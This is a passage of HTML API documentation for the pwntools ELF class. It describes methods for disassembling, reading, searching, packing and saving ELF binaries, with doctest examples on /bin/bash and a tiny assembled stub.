<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">disasm</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;foo&#39;</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span>
<span class="go">&#39;  400001:       cd 80                   int    0x80&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="staticmethod">
<dt id="pwnlib.elf.elf.ELF.from_bytes">
<em class="property">static </em><code class="descname">from_bytes</code><span class="sig-paren">(</span><em>bytes</em><span class="sig-paren">)</span> &#x2192; ELF<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.from_bytes" title="Permalink to this definition">¶</a></dt>
<dd><p>Given a sequence of bytes, return a fully loaded ELF object
which contains those bytes at its entry point.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>bytes</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Shellcode byte string</li>
<li><strong>vma</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Desired base address for the ELF.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x90\xcd\x80</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">vma</span><span class="o">=</span><span class="mh">0xc000</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">disasm</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">entry</span><span class="p">,</span> <span class="mi">3</span><span class="p">))</span>
<span class="go">    c000:       90                      nop</span>
<span class="go">    c001:       cd 80                   int    0x80</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.get_section_by_name">
<code class="descname">get_section_by_name</code><span class="sig-paren">(</span><em>name</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L85-97"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.get_section_by_name" title="Permalink to this definition">¶</a></dt>
<dd><p>Get a section from the file, by name. Return None if no such
section exists.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.iter_segments_by_type">
<code class="descname">iter_segments_by_type</code><span class="sig-paren">(</span><em>t</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L455-462"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.iter_segments_by_type" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Yields:</th><td class="field-body">Segments matching the specified type.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.num_sections">
<code class="descname">num_sections</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L73-76"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.num_sections" title="Permalink to this definition">¶</a></dt>
<dd><p>Number of sections in the file</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.num_segments">
<code class="descname">num_segments</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L105-108"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.num_segments" title="Permalink to this definition">¶</a></dt>
<dd><p>Number of segments in the file</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.offset_to_vaddr">
<code class="descname">offset_to_vaddr</code><span class="sig-paren">(</span><em>offset</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L917-951"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.offset_to_vaddr" title="Permalink to this definition">¶</a></dt>
<dd><p>Translates the specified offset to a virtual address.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>offset</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Offset to translate</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><cite>int</cite> &#8211; Virtual address which corresponds to the file offset, or
<code class="xref py py-const docutils literal"><span class="pre">None</span></code>.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<p>This example shows that regardless of changes to the virtual
address layout by modifying <a class="reference internal" href="#pwnlib.elf.elf.ELF.address" title="pwnlib.elf.elf.ELF.address"><code class="xref py py-attr docutils literal"><span class="pre">ELF.address</span></code></a>, the offset
for any given address doesn&#8217;t change.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">address</span> <span class="o">==</span> <span class="n">bash</span><span class="o">.</span><span class="n">offset_to_vaddr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="mh">0x123456</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">address</span> <span class="o">==</span> <span class="n">bash</span><span class="o">.</span><span class="n">offset_to_vaddr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.p16">
<code class="descname">p16</code><span class="sig-paren">(</span><em>address</em>, <em>data</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1648-1651"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.p16" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes a 16-bit integer <code class="docutils literal"><span class="pre">data</span></code> to the specified <code class="docutils literal"><span class="pre">address</span></code></p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.p32">
<code class="descname">p32</code><span class="sig-paren">(</span><em>address</em>, <em>data</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1643-1646"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.p32" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes a 32-bit integer <code class="docutils literal"><span class="pre">data</span></code> to the specified <code class="docutils literal"><span class="pre">address</span></code></p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.p64">
<code class="descname">p64</code><span class="sig-paren">(</span><em>address</em>, <em>data</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1638-1641"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.p64" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes a 64-bit integer <code class="docutils literal"><span class="pre">data</span></code> to the specified <code class="docutils literal"><span class="pre">address</span></code></p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.p8">
<code class="descname">p8</code><span class="sig-paren">(</span><em>address</em>, <em>data</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1653-1656"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.p8" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes a 8-bit integer <code class="docutils literal"><span class="pre">data</span></code> to the specified <code class="docutils literal"><span class="pre">address</span></code></p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.pack">
<code class="descname">pack</code><span class="sig-paren">(</span><em>address</em>, <em>data</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1658-1661"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.pack" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes a packed integer <code class="docutils literal"><span class="pre">data</span></code> to the specified <code class="docutils literal"><span class="pre">address</span></code></p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.process">
<code class="descname">process</code><span class="sig-paren">(</span><em>argv=[]</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span> &#x2192; process<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L376-394"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.process" title="Permalink to this definition">¶</a></dt>
<dd><p>Execute the binary with <a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">process</span></code></a>.  Note that <code class="docutils literal"><span class="pre">argv</span></code>
is a list of arguments, and should not include <code class="docutils literal"><span class="pre">argv[0]</span></code>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>argv</strong> (<a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; List of arguments to the binary</li>
<li><strong>*args</strong> &#8211; Extra arguments to <a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">process</span></code></a></li>
<li><strong>**kwargs</strong> &#8211; Extra arguments to <a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">process</span></code></a></li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last"><a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">process</span></code></a></p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.read">
<code class="descname">read</code><span class="sig-paren">(</span><em>address</em>, <em>count</em><span class="sig-paren">)</span> &#x2192; bytes<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1023-1137"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.read" title="Permalink to this definition">¶</a></dt>
<dd><p>Read data from the specified virtual address</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Virtual address to read</li>
<li><strong>count</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number of bytes to read</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A <a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> object, or <code class="xref py py-const docutils literal"><span class="pre">None</span></code>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<p>The simplest example is just to read the ELF header.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">which</span><span class="p">(</span><span class="s1">&#39;bash&#39;</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">bash</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
<span class="go">&#39;\x7fELF&#39;</span>
</pre></div>
</div>
<p>ELF segments do not have to contain all of the data on-disk
that gets loaded into memory.</p>
<p>First, let&#8217;s create an ELF file has some code in two sections.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="gp">... </span><span class="s1">.section .A,&quot;awx&quot;</span>
<span class="gp">... </span><span class="s1">.global A</span>
<span class="gp">... </span><span class="s1">A: nop</span>
<span class="gp">... </span><span class="s1">.section .B,&quot;awx&quot;</span>
<span class="gp">... </span><span class="s1">.global B</span>
<span class="gp">... </span><span class="s1">B: int3</span>
<span class="gp">... </span><span class="s1">&#39;&#39;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">,</span> <span class="n">vma</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</pre></div>
</div>
<p>By default, these come right after eachother in memory.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">A</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
<span class="go">&#39;\x90\xcc&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">B</span> <span class="o">-</span> <span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">A</span>
<span class="go">1</span>
</pre></div>
</div>
<p>Let&#8217;s move the sections so that B is a little bit further away.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">objcopy</span> <span class="o">=</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">asm</span><span class="o">.</span><span class="n">_objcopy</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">objcopy</span> <span class="o">+=</span> <span class="p">[</span>
<span class="gp">... </span>    <span class="s1">&#39;--change-section-vma&#39;</span><span class="p">,</span> <span class="s1">&#39;.B+5&#39;</span><span class="p">,</span>
<span class="gp">... </span>    <span class="s1">&#39;--change-section-lma&#39;</span><span class="p">,</span> <span class="s1">&#39;.B+5&#39;</span><span class="p">,</span>
<span class="gp">... </span>    <span class="n">e</span><span class="o">.</span><span class="n">path</span>
<span class="gp">... </span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">(</span><span class="n">objcopy</span><span class="p">)</span>
<span class="go">0</span>
</pre></div>
</div>
<p>Now let&#8217;s re-load the ELF, and check again</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">B</span> <span class="o">-</span> <span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">A</span>
<span class="go">6</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">A</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
<span class="go">&#39;\x90\x00&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">A</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span>
<span class="go">&#39;\x90\x00\x00\x00\x00\x00\xcc&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">A</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
<span class="go">&#39;\x90\x00\x00\x00\x00\x00\xcc\x00\x00\x00&#39;</span>
</pre></div>
</div>
<p>Everything is relative to the user-selected base address, so moving
things around keeps everything working.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="mh">0x1000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">A</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
<span class="go">&#39;\x90\x00\x00\x00\x00\x00\xcc\x00\x00\x00&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.save">
<code class="descname">save</code><span class="sig-paren">(</span><em>path=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1166-1178"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.save" title="Permalink to this definition">¶</a></dt>
<dd><p>Save the ELF to a file</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">which</span><span class="p">(</span><span class="s1">&#39;bash&#39;</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s1">&#39;/tmp/bash_copy&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">copy</span> <span class="o">=</span> <span class="n">file</span><span class="p">(</span><span class="s1">&#39;/tmp/bash_copy&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span> <span class="o">=</span> <span class="n">file</span><span class="p">(</span><span class="n">which</span><span class="p">(</span><span class="s1">&#39;bash&#39;</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="o">==</span> <span class="n">copy</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.search">
<code class="descname">search</code><span class="sig-paren">(</span><em>needle</em>, <em>writable = False</em><span class="sig-paren">)</span> &#x2192; generator<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L863-915"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.search" title="Permalink to this definition">¶</a></dt>
<dd><p>Search the ELF&#8217;s virtual address space for the specified string.</p>
<p class="rubric">Notes</p>
<p>Does not search empty space between segments, or uninitialized
data.  This will only return data that actually exists in the
ELF file.  Searching for a long string of NULL bytes probably
won&#8217;t work.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>needle</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; String to search for.</li>
<li><strong>writable</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Search only writable sections.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Yields:</th><td class="field-body"><p class="first last">An iterator for each virtual address that matches.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<p>An ELF header starts with the bytes <code class="docutils literal"><span class="pre">\x7fELF</span></code>, so we
sould be able to find it easily.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">==</span> <span class="nb">next</span><span class="p">(</span><span class="n">bash</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;ELF&#39;</span><span class="p">))</span>
<span class="go">True</span>
</pre></div>
</div>
<p>We can also search for string the binary.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">len</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">bash</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;GNU bash&#39;</span><span class="p">)))</span> <span class="o">&gt;</span> <span class="mi">0</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.section">
<code class="descname">section</code><span class="sig-paren">(</span><em>name</em><span class="sig-paren">)</span> &#x2192; bytes<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L532-543"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.section" title="Permalink to this definition">¶</a></dt>
<dd><p>Gets data for the named section</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>name</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Name of the section</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; String containing the bytes for that section</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.string">
<code class="descname">string</code><span class="sig-paren">(</span><em>address</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1688-1715"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.string" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads a null-terminated string from the specified <code class="docutils literal"><span class="pre">address</span></code></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">A <code class="docutils literal"><span class="pre">str</span></code> with the string contents (NUL terminator is omitted),
or an empty string if no NUL terminator could be found.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.u16">
<code class="descname">u16</code><span class="sig-paren">(</span><em>address</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1673-1676"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.u16" title="Permalink to this definition">¶</a></dt>
<dd><p>Unpacks an integer from the specified <code class="docutils literal"><span class="pre">address</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.u32">
<code class="descname">u32</code><span class="sig-paren">(</span><em>address</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1668-1671"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.u32" title="Permalink to this definition">¶</a></dt>
<dd><p>Unpacks an integer from the specified <code class="docutils literal"><span class="pre">address</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.u64">
<code class="descname">u64</code><span class="sig-paren">(</span><em>address</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1663-1666"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.u64" title="Permalink to this definition">¶</a></dt>
<dd><p>Unpacks an integer from the specified <code class="docutils literal"><span class="pre">address</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.u8">
<code class="descname">u8</code><span class="sig-paren">(</span><em>address</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1678-1681"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.u8" title="Permalink to this definition">¶</a></dt>
<dd><p>Unpacks an integer from the specified <code class="docutils literal"><span class="pre">address</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.unpack">
<code class="descname">unpack</code><span class="sig-paren">(</span><em>address</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1683-1686"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.unpack" title="Permalink to this definition">¶</a></dt>
<dd><p>Unpacks an integer from the specified <code class="docutils literal"><span class="pre">address</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.vaddr_to_offset">
<code class="descname">vaddr_to_offset</code><span class="sig-paren">(</span><em>address</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L988-1021"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.vaddr_to_offset" title="Permalink to this definition">¶</a></dt>
<dd><p>Translates the specified virtual address to a file offset</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Virtual address to translate</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><em>int</em> &#8211; Offset within the ELF file which corresponds to the address,
or <code class="xref py py-const docutils literal"><span class="pre">None</span></code>.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">which</span><span class="p">(</span><span class="s1">&#39;bash&#39;</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">vaddr_to_offset</span><span class="p">(</span><span class="n">bash</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
<span class="go">0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="mh">0x123456</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">vaddr_to_offset</span><span class="p">(</span><span class="n">bash</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
<span class="go">0</span>
